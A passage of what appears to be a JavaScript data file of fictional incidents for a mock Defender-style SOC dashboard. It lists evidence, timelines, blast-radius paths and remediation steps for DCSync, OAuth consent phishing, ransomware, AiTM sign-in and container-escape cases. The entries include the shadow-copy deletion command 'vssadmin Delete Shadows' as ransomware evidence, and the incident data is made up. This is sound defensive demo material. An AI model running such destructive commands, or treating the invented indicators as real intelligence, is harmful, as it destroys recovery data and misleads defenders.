  { id:'AIR-7102', incident:'INC-1042', title:'Phishing and OAuth consent abuse', status:'Waiting for approval', verdict:'Malicious', actions:['Soft-delete phishing email','Revoke user sessions','Remove OAuth consent'], disruption:false },
  { id:'AIR-7103', incident:'INC-1031', title:'Scanner update hash drift', status:'Completed', verdict:'Benign', actions:['No remediation','Recommended tuning review'], disruption:false },
];

const INCIDENT_INVESTIGATION_GUIDE = {
  source:'Product documentation: Investigate incidents in the Defender portal',
  lastUpdated:'2026-03-11',
  workflow:[
    { title:'Initial investigation',
      detail:'Start from the incident queue or summary pane, review priority, recommendations, related threats, and open the incident page for the full story.' },
    { title:'Attack story',
      detail:'Review the alert story, the incident graph, entity context, chronology, and remediation actions while staying in the same investigation context.' },
    { title:'Go hunt',
      detail:'Pivot from a device, file, IP, URL, user, mailbox, email, app, or cloud resource into advanced hunting queries, then link useful results back to the incident.' },
    { title:'Blast radius',
      detail:'For supported Sentinel data lake tenants, inspect likely propagation paths from an incident node to critical targets and use that context to contain the breach.' },
    { title:'Incident details',
      detail:'Check assignment, ID, classification, categories, first and last activity, impacted assets, recommendations, and disruption or threat context.' },
    { title:'Filter graph',
      detail:'On large incidents, filter by severity, status, or service source, and hide entity types so the graph stays focused on useful investigation paths.' },
    { title:'Alerts',
      detail:'Review related alerts in chronological order, inspect affected entities, and understand why alerts were correlated into the incident.' },
    { title:'Activities',
      detail:'Use the unified activity timeline to audit analyst actions, automation, comments, severity updates, merges, workflow runs, and policy changes.' },
    { title:'Assets',
      detail:'Review impacted devices, users, mailboxes, apps, and cloud resources, then pivot to inventory or entity detail pages for deeper response actions.' },
    { title:'Investigations',
      detail:'Check automated investigation and response status, approve pending actions when required, and inspect the investigation graph for related entities.' },
    { title:'Evidence and Response',
      detail:'Review files, processes, emails, services, IP addresses, and other evidence with verdicts and remediation state; approve or reject pending remediation.' },
    { title:'Summary',
      detail:'Use the summary view for a fast snapshot of alert categories, scope, evidence count, incident properties, and key entities.' },
    { title:'Similar incidents',
      detail:'Compare incidents with similar alerts, entities, or properties to assess campaign scope and whether related cases should be handled together.' },
  ],
  blastRadius:{
    prerequisites:['Sentinel data lake onboarding','Exposure management read permission or higher'],
    notes:[
      'Replaces attack path analysis in the incident experience.',
      'Shows possible paths, not guaranteed attacker movement.',
      'Path length is bounded by environment type and available graph data.',
      'Results depend on the viewer RBAC scope and data freshness.',
      'Critical assets must be defined for the graph to show business-impact paths.'
    ],
    roleUses:[
      { role:'Security analyst', use:'Understand current scope, likely paths to targets, and containment points.' },
      { role:'SOC engineer', use:'Prioritize defensive work and communicate protected versus impacted assets.' },
      { role:'Incident response', use:'Map affected systems quickly and take targeted action.' },
      { role:'Security leadership', use:'Track exposure reduction and report response progress.' },
    ]
  }
};

// ---- Per-incident enrichment: activities, evidence, summary, similar, blast paths ----
// Sourced from MS Learn: Investigate incidents in the Defender portal.
// Each entry is keyed by incident id; renderIncidentDetail falls back to a generic
// template when an incident is not listed here.

const INCIDENT_ACTIVITIES = {
  'INC-1019': [
    { time:'2026-06-28T03:46:00Z', performedBy:'System (correlation)', origin:'Automation',
      category:'Incident', trigger:'Alert correlation',
      detail:'Alerts A101 and A102 merged into INC-1019 by Defender XDR.' },
    { time:'2026-06-28T03:48:00Z', performedBy:'Me', origin:'Analyst',
      category:'Assignment', trigger:'Manual',
      detail:'Severity set to High; incident assigned to Me.' },
    { time:'2026-06-28T03:52:00Z', performedBy:'Playbook PB-IsolateDC', origin:'Automation',
      category:'Response', trigger:'Automation rule',
      detail:'svc-backup sessions revoked; DC01 isolated pending approval.' },
  ],
  'INC-1042': [
    { time:'2026-06-28T08:25:00Z', performedBy:'System (correlation)', origin:'Automation',
      category:'Incident', trigger:'Alert correlation',
      detail:'Phishing-click alert linked to OAuth consent alert; combined into INC-1042.' },
    { time:'2026-06-28T08:31:00Z', performedBy:'L1-Triage', origin:'Analyst',
      category:'Tag', trigger:'Manual',
      detail:'Tag identity-attack applied; severity confirmed High.' },
    { time:'2026-06-28T08:34:00Z', performedBy:'Playbook PB-RevokeOAuthConsent', origin:'Automation',
      category:'Response', trigger:'Automation rule',
      detail:'DocViewer Pro consent revoked for jane.doe; awaiting tenant-wide block approval.' },
  ],
  'INC-1050': [
    { time:'2026-06-28T10:21:00Z', performedBy:'System (correlation)', origin:'Automation',
      category:'Incident', trigger:'Alert correlation',
      detail:'Ransomware and shadow-copy deletion alerts merged into INC-1050.' },
    { time:'2026-06-28T10:22:00Z', performedBy:'AIR', origin:'Automation',
      category:'Investigation', trigger:'Automated investigation',
      detail:'Automated investigation started; FIN-FS-02 isolated.' },
    { time:'2026-06-28T10:27:00Z', performedBy:'cloud-sec', origin:'Analyst',
      category:'Comment', trigger:'Manual',
      detail:'Backup snapshots from 06-27 confirmed restorable; preparing recovery plan.' },
  ],
};

const INCIDENT_EVIDENCE = {
  'INC-1019': [
    { type:'User',    name:'svc-backup',                  verdict:'Suspicious', remediation:'Pending approval', action:'Disable account' },
    { type:'Device',  name:'DC01',                        verdict:'Suspicious', remediation:'Pending approval', action:'Isolate device' },
    { type:'IP',      name:'10.20.4.55',                  verdict:'Suspicious', remediation:'Not remediated',   action:'Block at firewall' },
    { type:'Object',  name:'AdminSDHolder ACL change',    verdict:'Malicious',  remediation:'Pending approval', action:'Revert ACL' },
  ],
  'INC-1042': [
    { type:'Email',   name:'Phishing message id 0x4f1',   verdict:'Malicious',  remediation:'Remediated',       action:'Soft-deleted' },
    { type:'URL',     name:'secure-document-portal[.]xyz',verdict:'Malicious',  remediation:'Remediated',       action:'Tenant-blocked' },
    { type:'OAuth app', name:'DocViewer Pro',             verdict:'Malicious',  remediation:'Pending approval', action:'Revoke + tenant block' },
    { type:'User',    name:'jane.doe@hacksmarterlabs.example',        verdict:'Suspicious', remediation:'Remediated',       action:'Sessions revoked' },
  ],
  'INC-1050': [
    { type:'File',    name:'locker.exe',                  verdict:'Malicious',  remediation:'Remediated',       action:'Quarantined' },
    { type:'Process', name:'vssadmin.exe Delete Shadows', verdict:'Malicious',  remediation:'Remediated',       action:'Process tree killed' },
    { type:'Device',  name:'FIN-FS-02',                   verdict:'Suspicious', remediation:'Remediated',       action:'Isolated' },
    { type:'Files',   name:'Finance share (12,847 files)',verdict:'Suspicious', remediation:'Pending approval', action:'Restore from snapshot' },
  ],
};

const SIMILAR_INCIDENTS = {
  'INC-1019': [
    { id:'INC-0987', title:'svc-backup directory replication (3 weeks ago)', similarity:'Same user + tactic', severity:'medium' },
    { id:'INC-0902', title:'DCSync from svc-monitor', similarity:'Shared MITRE T1003.006', severity:'high' },
  ],
  'INC-1042': [
    { id:'INC-1031', title:'OAuth consent abuse (DocSign Plus)', similarity:'Same tactic, related app family', severity:'medium' },
    { id:'INC-1024', title:'Phishing leading to credential entry', similarity:'Same initial access vector', severity:'medium' },
  ],
  'INC-1050': [
    { id:'INC-0944', title:'Ransomware on HR file server', similarity:'Same kill-chain, different host', severity:'high' },
    { id:'INC-1024', title:'Scanner activity preceding ransomware', similarity:'Possible recon precursor', severity:'medium' },
  ],
};

const BLAST_RADIUS_PATHS = {
  'INC-1019': {
    source:'DC01',
    paths:[
      { target:'Tier-0 admin group',  hops:2, reach:'Full domain admin compromise',           critical:true  },
      { target:'PKI root CA',         hops:3, reach:'Issue arbitrary smart-card certs',       critical:true  },
      { target:'Backup service',      hops:2, reach:'Tamper with restore points',             critical:true  },
      { target:'Finance file server', hops:4, reach:'Read/modify finance shares',             critical:false },
    ],
  },
  'INC-1042': {
    source:'jane.doe@hacksmarterlabs.example',
    paths:[
      { target:'Finance SharePoint site', hops:2, reach:'Exfiltrate quarterly forecast docs',   critical:true  },
      { target:'Exec mailbox delegates',  hops:3, reach:'Read CFO mailbox via OAuth scope',     critical:true  },
      { target:'M365 admin role',         hops:4, reach:'Privilege escalation via app consent', critical:false },
    ],
  },
  'INC-1050': {
    source:'FIN-FS-02',
    paths:[
      { target:'Backup repository',  hops:2, reach:'Encrypt or delete backups',          critical:true  },
      { target:'Domain controller',  hops:3, reach:'Lateral movement to DC',             critical:true  },
      { target:'Finance workstations',hops:2,reach:'Spread via SMB shares',              critical:false },
    ],
  },
};

// Attack story graphs. Nodes carry a `ring` (0=center, 1=primary entity,
// 2=blast-radius / downstream target). Edges can connect any two nodes
// (not just consecutive), so the renderer draws a webby graph instead of
// a linear chain. Edge.kind hints styling: 'attack' (solid), 'blast'
// (dashed downstream), 'related' (thin gray).
const ATTACK_STORIES = {
  'INC-1019': {
    nodes:[
      { id:'dc01', type:'Device', label:'DC01', ring:0,
        verdict:'Suspicious', remediation:'Isolate device; preserve memory for forensics.' },
      { id:'svc-backup', type:'User', label:'svc-backup', ring:1,
        verdict:'Suspicious', remediation:'Disable account, revoke sessions, audit Kerberos delegation.' },
      { id:'ip-10-20-4-55', type:'IP', label:'10.20.4.55', ring:1,
        verdict:'Suspicious', remediation:'Block at firewall; trace owner & DHCP lease.' },
      { id:'adminsdholder', type:'Directory object', label:'AdminSDHolder', ring:1,
        verdict:'Malicious', remediation:'Revert ACL; review SDProp every-hour audit.' },
      { id:'krbtgt', type:'Account', label:'krbtgt', ring:1,
        verdict:'At risk', remediation:'Plan double krbtgt rotation if compromise confirmed.' },
      { id:'gpo-default', type:'GPO', label:'Default Domain Policy', ring:1,
        verdict:'Suspicious', remediation:'Compare GPO version; restore from last known-good.' },
      { id:'tier0-admins', type:'Group', label:'Tier-0 admins', ring:2,
        verdict:'At risk', remediation:'Full domain admin compromise possible — rotate creds.' },
      { id:'pki-root', type:'Service', label:'PKI root CA', ring:2,
        verdict:'At risk', remediation:'Smart-card cert forgery path; review ADCS issuance.' },
      { id:'backup-svc', type:'Service', label:'Backup service', ring:2,
        verdict:'At risk', remediation:'Verify backup integrity; protect restore points.' },
      { id:'fin-fs-02', type:'Device', label:'FIN-FS-02', ring:2,
        verdict:'Adjacent', remediation:'Monitor; could be reached via Tier-0 path.' },
      { id:'entra-global-admins', type:'Role', label:'Entra Global Administrators', ring:2,
        verdict:'At risk', remediation:'Review privileged role assignments and revoke suspicious tokens.' },
      { id:'key-vault-prod', type:'Vault', label:'Prod Key Vault', ring:2,
        verdict:'At risk', remediation:'Rotate secrets and validate access policies for Tier-0 principals.' },
    ],
    edges:[
      { from:'svc-backup', to:'ip-10-20-4-55', label:'authenticated from', kind:'attack' },
      { from:'ip-10-20-4-55', to:'dc01', label:'reached DC', kind:'attack' },
      { from:'svc-backup', to:'dc01', label:'DCSync request', kind:'attack' },
      { from:'dc01', to:'adminsdholder', label:'modified ACL', kind:'attack' },
      { from:'dc01', to:'krbtgt', label:'replicated secrets', kind:'attack' },
      { from:'dc01', to:'gpo-default', label:'wrote GPO', kind:'attack' },
      { from:'adminsdholder', to:'tier0-admins', label:'persists privilege', kind:'blast' },
      { from:'krbtgt', to:'tier0-admins', label:'golden ticket', kind:'blast' },
      { from:'dc01', to:'pki-root', label:'NTAuthCertificates', kind:'blast' },
      { from:'gpo-default', to:'backup-svc', label:'startup script', kind:'blast' },
      { from:'tier0-admins', to:'fin-fs-02', label:'lateral via admin$', kind:'blast' },
      { from:'tier0-admins', to:'entra-global-admins', label:'hybrid admin path', kind:'blast' },
      { from:'entra-global-admins', to:'key-vault-prod', label:'secret access', kind:'blast' },
    ],
    steps:[
      { time:'2026-06-28T03:42:00Z', node:'svc-backup', alertId:'A101',
        title:'svc-backup signed in from 10.20.4.55',
        detail:'Service account interactive sign-in from an unfamiliar subnet.',
        remediation:'Compare to baseline locations; disable if unauthorized.' },
      { time:'2026-06-28T03:43:00Z', node:'dc01', alertId:'A102',
        title:'Directory replication request',
        detail:'svc-backup requested domain replication from DC01 — classic DCSync.',
        remediation:'Disable svc-backup, isolate DC01, capture lsass and netstat.' },
      { time:'2026-06-28T03:44:00Z', node:'adminsdholder', alertId:'A101',
        title:'AdminSDHolder ACL touched',
        detail:'Protected-objects ACL modified — persistence pattern.',
        remediation:'Revert ACL; re-run SDProp; audit downstream admin groups.' },
    ]
  },
  'INC-1042': {
    nodes:[
      { id:'user-jane', type:'User', label:'jane.doe@hacksmarterlabs.example', ring:0,
        verdict:'Suspicious', remediation:'Revoke sessions; require phishing-resistant MFA.' },
      { id:'mailbox-jane', type:'Mailbox', label:'Jane Doe mailbox', ring:1,
        verdict:'At risk', remediation:'Audit inbox rules; check forwarding.' },
      { id:'url-doc', type:'URL', label:'secure-document-portal[.]xyz', ring:1,
        verdict:'Malicious', remediation:'Tenant-block; sweep clickers.' },
      { id:'app-docviewer', type:'OAuth app', label:'DocViewer Pro', ring:1,
        verdict:'Malicious', remediation:'Revoke consent; tenant-block app id.' },
      { id:'mail-api', type:'Cloud app', label:'Mail.ReadWrite scope', ring:1,
        verdict:'At risk', remediation:'Audit Graph mailbox access logs.' },
      { id:'consent-grant', type:'Permission', label:'Consent grant 0xA21', ring:1,
        verdict:'Malicious', remediation:'Revoke; investigate downstream API calls.' },
      { id:'finance-sp', type:'SharePoint site', label:'Finance SharePoint', ring:2,
        verdict:'At risk', remediation:'Exfil of quarterly forecasts possible.' },
      { id:'cfo-mailbox', type:'Mailbox', label:'CFO mailbox delegate', ring:2,
        verdict:'At risk', remediation:'CFO inbox readable via Mail.ReadWrite app scope.' },
      { id:'m365-admin', type:'Role', label:'M365 admin role', ring:2,
        verdict:'At risk', remediation:'Possible role escalation via app consent.' },
      { id:'teams-channel', type:'Channel', label:'Finance Teams channel', ring:2,
        verdict:'Adjacent', remediation:'Cross-app token may reach Teams chat history.' },
      { id:'payroll-sp', type:'SharePoint site', label:'Payroll SharePoint', ring:2,
        verdict:'At risk', remediation:'Sensitive payroll files reachable through Files.Read.All.' },
      { id:'hr-mailbox', type:'Mailbox', label:'HR shared mailbox', ring:2,
        verdict:'At risk', remediation:'Shared mailbox readable through delegated app access.' },
      { id:'powerbi-finance', type:'Power BI', label:'Finance Power BI', ring:2,
        verdict:'Adjacent', remediation:'Review app access to finance workspaces and datasets.' },
      { id:'legal-onedrive', type:'OneDrive', label:'Legal OneDrive', ring:2,
        verdict:'At risk', remediation:'Search for sensitive file reads from the app principal.' },
    ],
    edges:[
      { from:'mailbox-jane', to:'url-doc', label:'phishing email', kind:'attack' },
      { from:'url-doc', to:'user-jane', label:'cred-harvest sign-in', kind:'attack' },
      { from:'user-jane', to:'consent-grant', label:'granted', kind:'attack' },
      { from:'consent-grant', to:'app-docviewer', label:'on behalf of', kind:'attack' },
      { from:'app-docviewer', to:'mail-api', label:'requested scope', kind:'attack' },
      { from:'mail-api', to:'mailbox-jane', label:'reads inbox', kind:'attack' },
      { from:'mail-api', to:'cfo-mailbox', label:'reads delegate', kind:'blast' },
      { from:'app-docviewer', to:'finance-sp', label:'Files.Read.All', kind:'blast' },
      { from:'app-docviewer', to:'m365-admin', label:'admin-consent path', kind:'blast' },
      { from:'app-docviewer', to:'teams-channel', label:'ChannelMessage.Read', kind:'blast' },
      { from:'app-docviewer', to:'payroll-sp', label:'Files.Read.All', kind:'blast' },
      { from:'mail-api', to:'hr-mailbox', label:'shared mailbox', kind:'blast' },
      { from:'app-docviewer', to:'powerbi-finance', label:'workspace token', kind:'blast' },
      { from:'app-docviewer', to:'legal-onedrive', label:'OneDrive files', kind:'blast' },
    ],
    steps:[
      { time:'2026-06-28T08:11:00Z', node:'url-doc', alertId:'A201',
        title:'Malicious URL clicked',
        detail:'Jane opened a phishing link from an email message.',
        remediation:'Soft-delete the message tenant-wide; URL-block.' },
      { time:'2026-06-28T08:23:00Z', node:'consent-grant', alertId:'A202',
        title:'OAuth consent abuse',
        detail:'User granted broad Mail.ReadWrite/Files.Read.All to DocViewer Pro.',
        remediation:'Revoke consent; tenant-block app id; audit Graph calls.' },
      { time:'2026-06-28T08:24:00Z', node:'mail-api', alertId:'A202',
        title:'Mail API access from new app',
        detail:'DocViewer Pro began reading mailbox messages within seconds of consent.',
        remediation:'Block app; review what was read in the last 24h.' },
    ]
  },
  'INC-1050': {
    nodes:[
      { id:'fin-fs-02', type:'Device', label:'FIN-FS-02', ring:0,
        verdict:'Compromised', remediation:'Isolated; preserve volume for forensics.' },
      { id:'locker', type:'File', label:'locker.exe', ring:1,
        verdict:'Malicious', remediation:'Quarantined; pivot to indicators.' },
      { id:'vssadmin', type:'Process', label:'vssadmin Delete Shadows', ring:1,
        verdict:'Malicious', remediation:'Process tree killed; alert on future invocations.' },
      { id:'ransom-note', type:'File', label:'README_DECRYPT.txt', ring:1,
        verdict:'Malicious', remediation:'Collect note; correlate to threat-actor TTP.' },
      { id:'finance-shares', type:'Files', label:'Finance share (12,847)', ring:1,
        verdict:'Encrypted', remediation:'Restore from 06-27 snapshot.' },
      { id:'fin-svc', type:'User', label:'fin-svc (service)', ring:1,
        verdict:'Suspicious', remediation:'Disable; check stored creds + scheduled tasks.' },
      { id:'backup-repo', type:'Service', label:'Backup repository', ring:2,
        verdict:'At risk', remediation:'Verify integrity; lock backup admin creds.' },
      { id:'dc01', type:'Device', label:'DC01', ring:2,
        verdict:'At risk', remediation:'Lateral movement possible — review admin$ shares.' },
      { id:'fin-workstations', type:'Devices', label:'Finance workstations', ring:2,
        verdict:'Adjacent', remediation:'SMB spread risk — sweep for locker.exe.' },
      { id:'erp-app', type:'App', label:'ERP application', ring:2,
        verdict:'Adjacent', remediation:'ERP shares mounted from FIN-FS-02 — check session.' },
    ],
    edges:[
      { from:'fin-svc', to:'fin-fs-02', label:'executed under', kind:'attack' },
      { from:'fin-fs-02', to:'locker', label:'spawned', kind:'attack' },
      { from:'locker', to:'vssadmin', label:'launched', kind:'attack' },
      { from:'locker', to:'ransom-note', label:'dropped', kind:'attack' },
      { from:'locker', to:'finance-shares', label:'encryption impact', kind:'attack' },
      { from:'vssadmin', to:'finance-shares', label:'removed recovery', kind:'attack' },
      { from:'finance-shares', to:'backup-repo', label:'backup chain', kind:'blast' },
      { from:'fin-fs-02', to:'dc01', label:'admin$ over SMB', kind:'blast' },
      { from:'fin-fs-02', to:'fin-workstations', label:'mapped drives', kind:'blast' },
      { from:'finance-shares', to:'erp-app', label:'mounted by', kind:'blast' },
    ],
    steps:[
      { time:'2026-06-28T10:18:00Z', node:'locker', alertId:'A301',
        title:'Ransomware launched',
        detail:'Encryption behavior + ransom-note creation detected on FIN-FS-02.',
        remediation:'Quarantine; isolate host; capture process tree.' },
      { time:'2026-06-28T10:20:00Z', node:'vssadmin', alertId:'A302',
        title:'Recovery blocked',
        detail:'Shadow copies were deleted before mass file rename.',
        remediation:'Kill tree; ensure backup repository is air-gapped.' },
      { time:'2026-06-28T10:22:00Z', node:'finance-shares', alertId:'A301',
        title:'Mass file rename across share',
        detail:'12,847 files renamed with .locked extension in 90 seconds.',
        remediation:'Restore from 06-27 snapshot; communicate RTO to business.' },
    ]
  },
  'INC-1024': {
    nodes:[
      { id:'scanner-old', type:'File', label:'scanner.exe (legit)', ring:0,
        verdict:'Suppressed', remediation:'Confirm hash matches vendor signature.' },
      { id:'wks-01', type:'Device', label:'WKS-01', ring:1,
        verdict:'Benign', remediation:'Normal scheduled scan.' },
      { id:'wks-02', type:'Device', label:'WKS-02', ring:1,
        verdict:'Benign', remediation:'Normal scheduled scan.' },
      { id:'svc-scan', type:'User', label:'svc-scan', ring:1,
        verdict:'Benign', remediation:'Confirm RBAC scope on scanner service account.' },
      { id:'supp-rule', type:'Rule', label:'Suppress vuln scanner', ring:1,
        verdict:'Active', remediation:'Pinned to file_name + sha256 (AND).' },
      { id:'vendor-cert', type:'Certificate', label:'Vendor signing cert', ring:1,
        verdict:'Trusted', remediation:'Watch for cert revocation.' },
      { id:'dc01', type:'Device', label:'DC01', ring:2,
        verdict:'Recon target', remediation:'Scanner port-scans the DC — verify expected.' },
      { id:'finance-shares', type:'Files', label:'Finance shares', ring:2,
        verdict:'Recon target', remediation:'Scanner inspects shares — confirm scope.' },
      { id:'vpn-gw', type:'Service', label:'VPN gateway', ring:2,
        verdict:'Recon target', remediation:'Scanner enumerates VPN endpoints.' },
    ],
    edges:[
      { from:'svc-scan', to:'wks-01', label:'launched', kind:'attack' },
      { from:'svc-scan', to:'wks-02', label:'launched', kind:'attack' },
      { from:'wks-01', to:'scanner-old', label:'executed', kind:'attack' },
      { from:'wks-02', to:'scanner-old', label:'executed', kind:'attack' },
      { from:'scanner-old', to:'supp-rule', label:'matched (AND)', kind:'related' },
      { from:'scanner-old', to:'vendor-cert', label:'signed by', kind:'related' },
      { from:'scanner-old', to:'dc01', label:'port-scanned', kind:'blast' },
      { from:'scanner-old', to:'finance-shares', label:'enumerated', kind:'blast' },
      { from:'scanner-old', to:'vpn-gw', label:'banner-grabbed', kind:'blast' },
    ],
    steps:[
      { time:'2026-06-28T09:00:00Z', node:'wks-01', alertId:'A001',
        title:'Scanner run on WKS-01',
        detail:'scanner.exe ran with the known-good vendor hash.',
        remediation:'Suppressed by rule — file_name AND sha256 both matched.' },
      { time:'2026-06-28T09:05:00Z', node:'wks-02', alertId:'A002',
        title:'Scanner run on WKS-02',
        detail:'Same vendor binary; same conditions; suppressed.',
        remediation:'Suppressed by rule.' },
    ]
  },
  'INC-1031': {
    nodes:[
      { id:'scanner-new', type:'File', label:'scanner.exe (post-update)', ring:0,
        verdict:'Unsuppressed', remediation:'Update rule to track new hash or use signer.' },
      { id:'wks-01', type:'Device', label:'WKS-01', ring:1,
        verdict:'Alerting', remediation:'Vendor-updated binary fired alert.' },
      { id:'wks-02', type:'Device', label:'WKS-02', ring:1,
        verdict:'Alerting', remediation:'Vendor-updated binary fired alert.' },
      { id:'svc-scan', type:'User', label:'svc-scan', ring:1,
        verdict:'Benign', remediation:'Same service account as before.' },
      { id:'supp-rule', type:'Rule', label:'Old suppression rule', ring:1,
        verdict:'Stale', remediation:'Replace exact-hash with vendor-signer condition.' },
      { id:'vendor-update', type:'Update', label:'Vendor 4.1.2 patch', ring:1,
        verdict:'Trusted', remediation:'Confirm release notes match new hash.' },
      { id:'soc-queue', type:'Queue', label:'L1 triage queue', ring:2,
        verdict:'Noise risk', remediation:'Two false-positives queued per patch cycle.' },
      { id:'dc01', type:'Device', label:'DC01', ring:2,
        verdict:'Recon target', remediation:'Same scope as INC-1024.' },
      { id:'finance-shares', type:'Files', label:'Finance shares', ring:2,
        verdict:'Recon target', remediation:'Same scope as INC-1024.' },
    ],
    edges:[
      { from:'vendor-update', to:'scanner-new', label:'new sha256', kind:'attack' },
      { from:'svc-scan', to:'wks-01', label:'launched', kind:'attack' },
      { from:'svc-scan', to:'wks-02', label:'launched', kind:'attack' },
      { from:'wks-01', to:'scanner-new', label:'executed', kind:'attack' },
      { from:'wks-02', to:'scanner-new', label:'executed', kind:'attack' },
      { from:'scanner-new', to:'supp-rule', label:'no match', kind:'related' },
      { from:'scanner-new', to:'soc-queue', label:'alerts route to', kind:'blast' },
      { from:'scanner-new', to:'dc01', label:'port-scanned', kind:'blast' },
      { from:'scanner-new', to:'finance-shares', label:'enumerated', kind:'blast' },
    ],
    steps:[
      { time:'2026-06-28T14:00:00Z', node:'wks-01', alertId:'A003',
        title:'Scanner run after vendor update (WKS-01)',
        detail:'New hash; old suppression no longer matches.',
        remediation:'Update rule to track signer rather than hash.' },
      { time:'2026-06-28T14:15:00Z', node:'wks-02', alertId:'A004',
        title:'Scanner run after vendor update (WKS-02)',
        detail:'Same new hash; second false positive.',
        remediation:'Update rule; communicate change to SOC.' },
    ]
  },
  'INC-1038': {
    nodes:[
      { id:'rogue', type:'File', label:'scanner.exe (rogue)', ring:0,
        verdict:'Malicious', remediation:'Quarantine; pivot to indicators tenant-wide.' },
      { id:'wks-03', type:'Device', label:'WKS-03', ring:1,
        verdict:'Compromised', remediation:'Isolate; collect process tree.' },
      { id:'public-folder', type:'Path', label:'C:\\Users\\Public', ring:1,
        verdict:'Staging', remediation:'Hunt for other staged binaries.' },
      { id:'jdoe', type:'User', label:'jdoe', ring:1,
        verdict:'Suspicious', remediation:'Likely phished; revoke sessions.' },
      { id:'explorer', type:'Process', label:'explorer.exe (parent)', ring:1,
        verdict:'Living-off-land', remediation:'Confirm interactive launch.' },
      { id:'no-cert', type:'Certificate', label:'Unsigned binary', ring:1,
        verdict:'Indicator', remediation:'Block by hash + add to ASR rules.' },
      { id:'ad-admins', type:'Group', label:'AD admins group', ring:2,
        verdict:'At risk', remediation:'Audit recent membership changes.' },
      { id:'customer-db', type:'Database', label:'Customer DB', ring:2,
        verdict:'At risk', remediation:'Review reads from WKS-03 in last 24h.' },
      { id:'dc01', type:'Device', label:'DC01', ring:2,
        verdict:'At risk', remediation:'Watch for follow-on Kerberoasting.' },
    ],
    edges:[
      { from:'jdoe', to:'wks-03', label:'signed in', kind:'attack' },
      { from:'explorer', to:'rogue', label:'spawned', kind:'attack' },
      { from:'rogue', to:'public-folder', label:'staged in', kind:'attack' },
      { from:'rogue', to:'wks-03', label:'lives on', kind:'attack' },
      { from:'rogue', to:'no-cert', label:'no signature', kind:'related' },
      { from:'wks-03', to:'dc01', label:'Kerberos auth', kind:'blast' },
      { from:'wks-03', to:'customer-db', label:'reads', kind:'blast' },
      { from:'rogue', to:'ad-admins', label:'enumerates', kind:'blast' },
    ],
    steps:[
      { time:'2026-06-28T15:00:00Z', node:'rogue', alertId:'A005',
        title:'Unsigned scanner.exe in C:\\Users\\Public',
        detail:'File name matches the legitimate tool but hash is unknown and binary is unsigned.',
        remediation:'Block by hash; isolate WKS-03; collect investigation package.' },
    ]
  },
  'INC-1051': {
    nodes:[
      { id:'maria', type:'User', label:'maria.ross@hacksmarterlabs.example', ring:0,
        verdict:'Compromised', remediation:'Revoke sessions; reset creds; enforce FIDO2.' },
      { id:'aitm-ip', type:'IP', label:'185.199.111.12 (AiTM proxy)', ring:1,
        verdict:'Malicious', remediation:'Block at IdP and edge; report to CTI.' },
      { id:'mfa-token', type:'Token', label:'Proxied MFA session', ring:1,
        verdict:'Malicious', remediation:'Revoke refresh tokens.' },
      { id:'ca-policy', type:'Policy', label:'Conditional Access', ring:1,
        verdict:'Bypassed', remediation:'Require phishing-resistant MFA for finance group.' },
      { id:'sign-in', type:'Sign-in', label:'06:41 sign-in event', ring:1,
        verdict:'Risky', remediation:'Mark user high-risk in Identity Protection.' },
      { id:'phish-page', type:'URL', label:'login-cloud[.]click', ring:1,
        verdict:'Malicious', remediation:'Tenant-block; sweep clickers from email logs.' },
      { id:'sharepoint', type:'SharePoint site', label:'Finance SharePoint', ring:2,
        verdict:'At risk', remediation:'Audit doc access for last 4h.' },
      { id:'exchange', type:'Service', label:'Exchange Online', ring:2,
        verdict:'At risk', remediation:'Inspect inbox rules / forwarding.' },
      { id:'teams', type:'Service', label:'Teams chat history', ring:2,
        verdict:'At risk', remediation:'Token covers Teams scope.' },
      { id:'crm', type:'App', label:'Sales CRM (SSO)', ring:2,
        verdict:'At risk', remediation:'SSO downstream; review CRM access logs.' },
    ],
    edges:[
      { from:'phish-page', to:'aitm-ip', label:'served by', kind:'attack' },
      { from:'maria', to:'phish-page', label:'entered creds', kind:'attack' },
      { from:'aitm-ip', to:'mfa-token', label:'proxied MFA', kind:'attack' },
      { from:'mfa-token', to:'sign-in', label:'sealed session', kind:'attack' },
      { from:'sign-in', to:'maria', label:'as user', kind:'attack' },
      { from:'sign-in', to:'ca-policy', label:'evaluated', kind:'related' },
      { from:'mfa-token', to:'sharepoint', label:'SSO scope', kind:'blast' },
      { from:'mfa-token', to:'exchange', label:'SSO scope', kind:'blast' },
      { from:'mfa-token', to:'teams', label:'SSO scope', kind:'blast' },
      { from:'mfa-token', to:'crm', label:'SSO scope', kind:'blast' },
    ],
    steps:[
      { time:'2026-06-28T06:41:00Z', node:'sign-in', alertId:'A401',
        title:'High-risk sign-in via AiTM proxy',
        detail:'Valid MFA response came through a known AiTM proxy IP.',
        remediation:'Revoke sessions; require phishing-resistant MFA.' },
    ]
  },
  'INC-1052': {
    nodes:[
      { id:'pod', type:'Container', label:'pod-api-77', ring:0,
        verdict:'Compromised', remediation:'Cordon node; collect pod logs + image.' },
      { id:'cluster', type:'Cluster', label:'aks-prod', ring:1,
        verdict:'At risk', remediation:'Rotate cluster admin certs.' },
      { id:'node-3', type:'Device', label:'aks-prod/node-3', ring:1,
        verdict:'At risk', remediation:'Drain + reimage.' },
      { id:'setns', type:'Syscall', label:'setns() call', ring:1,
        verdict:'Malicious', remediation:'Indicator of escape attempt.' },
      { id:'image', type:'Image', label:'api:v2.4.1 (vuln)', ring:1,
        verdict:'Vulnerable', remediation:'Pin to patched tag; rebuild.' },
      { id:'sa-token', type:'Token', label:'Service-account token', ring:1,
        verdict:'At risk', remediation:'Revoke; recreate SA.' },
      { id:'kubelet', type:'Service', label:'kubelet', ring:2,
        verdict:'At risk', remediation:'Audit /pods endpoint access.' },
      { id:'api-server', type:'Service', label:'kube-apiserver', ring:2,
        verdict:'At risk', remediation:'Review SA permissions to API.' },
      { id:'etcd', type:'Service', label:'etcd', ring:2,
        verdict:'Critical', remediation:'Confirm no secrets exfil; rotate keys.' },
      { id:'cloud-creds', type:'Credential', label:'Node instance creds (IMDS)', ring:2,
        verdict:'At risk', remediation:'Rotate IAM role; disable IMDSv1.' },
    ],
    edges:[
      { from:'image', to:'pod', label:'runs as', kind:'attack' },
      { from:'pod', to:'setns', label:'invoked', kind:'attack' },
      { from:'setns', to:'node-3', label:'host namespace', kind:'attack' },
      { from:'pod', to:'sa-token', label:'mounts', kind:'attack' },
      { from:'pod', to:'cluster', label:'workload in', kind:'related' },
      { from:'sa-token', to:'api-server', label:'authenticates', kind:'blast' },
      { from:'api-server', to:'etcd', label:'reads secrets', kind:'blast' },
      { from:'node-3', to:'kubelet', label:'host control', kind:'blast' },
      { from:'node-3', to:'cloud-creds', label:'IMDS access', kind:'blast' },
    ],
    steps:[
